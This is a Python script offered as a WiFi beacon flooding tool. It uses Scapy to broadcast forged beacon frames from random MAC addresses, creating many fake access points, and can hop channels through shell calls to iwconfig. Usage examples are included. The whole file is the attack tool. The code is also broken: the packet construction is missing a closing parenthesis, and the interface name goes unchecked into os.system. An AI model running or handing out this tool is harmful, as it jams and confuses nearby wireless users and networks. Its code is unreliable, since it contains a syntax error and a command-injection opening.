import argparse
import random
import logging
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, RadioTap, Dot11Elt

# -------------------------------------------
# WiFi Beacon Flooding Tool
# -------------------------------------------
# Features:
# - Flood the area with fake WiFi access points.
# - Customize SSID prefixes and MAC addresses.
# - Automatically hop between WiFi channels.
# - Log all actions and results.
#
# Requirements:
# - Wireless adapter supporting monitor mode (e.g., Alfa AWUS036ACH)
# - Python 3.x
# - Scapy library
#
# Usage:
# 1. Flood with default settings:
#    python wifi_beacon_flood.py --interface wlan0
# 2. Customize SSID prefix and count:
#    python wifi_beacon_flood.py --interface wlan0 --ssid FakeNet --count 200
# 3. Enable channel hopping:
#    python wifi_beacon_flood.py --interface wlan0 --channel-hop
# -------------------------------------------

# Global variables
logging.basicConfig(filename="beacon_flood.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def log_event(message):
    """Log an event to the log file."""
    logging.info(message)
    print(message)

def generate_random_mac():
    """Generate a random MAC address."""
    return ":".join(f"{random.randint(0x00, 0xff):02x}" for _ in range(6))

def beacon_flood(interface, ssid_prefix="FakeNet", count=100, channel_hop=False):
    """
    Flood the area with fake WiFi access points.
    :param interface: Wireless interface in monitor mode.
    :param ssid_prefix: Prefix for fake SSIDs.
    :param count: Number of fake access points to create.
    :param channel_hop: Whether to enable channel hopping.
    """
    log_event(f"[+] Starting beacon flood with {count} fake SSIDs on {interface}...")
    channels = [1, 6, 11]  # Common WiFi channels
    try:
        for i in range(count):
            ssid = f"{ssid_prefix}_{i}"
            mac = generate_random_mac()
            if channel_hop:
                channel = random.choice(channels)
                os.system(f"iwconfig {interface} channel {channel}")
                log_event(f"[*] Switched to channel {channel}")
            packet = (
                RadioTap() /
                Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) /
                Dot11Beacon(cap="ESS") /
                Dot11Elt(ID="SSID", info=ssid)
            sendp(packet, iface=interface, verbose=False)
        log_event("[✔] Beacon flood complete.")
    except Exception as e:
        log_event(f"[!] Error during beacon flood: {e}")

def main():
    parser = argparse.ArgumentParser(description="WiFi Beacon Flooding Tool")
    parser.add_argument("--interface", type=str, required=True, help="Wireless interface in monitor mode")
    parser.add_argument("--ssid", type=str, default="FakeNet", help="Prefix for fake SSIDs (default: FakeNet)")
    parser.add_argument("--count", type=int, default=100, help="Number of fake access points to create (default: 100)")
    parser.add_argument("--channel-hop", action="store_true", help="Enable channel hopping")
    args = parser.parse_args()

    beacon_flood(args.interface, args.ssid, args.count, args.channel_hop)

if __name__ == "__main__":
    main()